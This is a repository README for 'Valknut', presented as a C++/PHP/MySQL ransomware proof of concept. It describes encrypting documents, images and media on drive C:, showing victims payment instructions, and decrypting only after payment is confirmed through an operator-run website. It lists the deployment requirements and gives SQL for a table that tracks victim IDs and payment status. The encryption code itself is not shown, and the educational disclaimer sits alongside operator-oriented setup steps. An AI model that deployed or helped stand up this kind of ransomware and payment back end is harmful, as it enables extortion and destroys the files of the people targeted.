# Disclaimer



WE DON'T PROMOTE OR ENCOURAGE ANY ILLEGAL ACTIVITIES,

ALL CONTENT PROVIDED BY THIS REPOSITORY IS FOR EDUCATIONAL PURPOSES ONLY.

USE AT YOUR OWN RISK, WE WILL NOT BE HELD ACCOUNTABLE FOR ANY DAMAGE.


# Valknut

**Valknut is a simple ransomware POC that was build using C++, PHP and MySQL.**

# Effect

1. Valknut runs in the background encrypting all **.txt .mp4 .mp3 .jpg .jpeg .doc .docx .png .pdf** files located on disk C:/
2. After encryption is done, a console will appear showing our victim the next steps needed in order to decrypt affected files.
3. After payment is done on our website ( using victim's decryption id ) and Valknut checks the transaction ( based on user input ), decryption of files will start.
4. When decryption is done, our ransomware will show that victim's affected files were *unlocked*. 


# USAGE

**In order for our ransomware to work you will need a website host ( xampp ) , mysql database ( xampp ) , libcurl.dll and Valknut.exe**

# SQL DATABASE CREATION
```
CREATE DATABASE IF NOT EXISTS `computers` /*!40100 DEFAULT CHARACTER SET utf8mb4 */;
USE `computers`;

-- Dumping structure for table computers.registry
CREATE TABLE IF NOT EXISTS `registry` (
  `id` varchar(100) DEFAULT NULL,
  `status` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

```
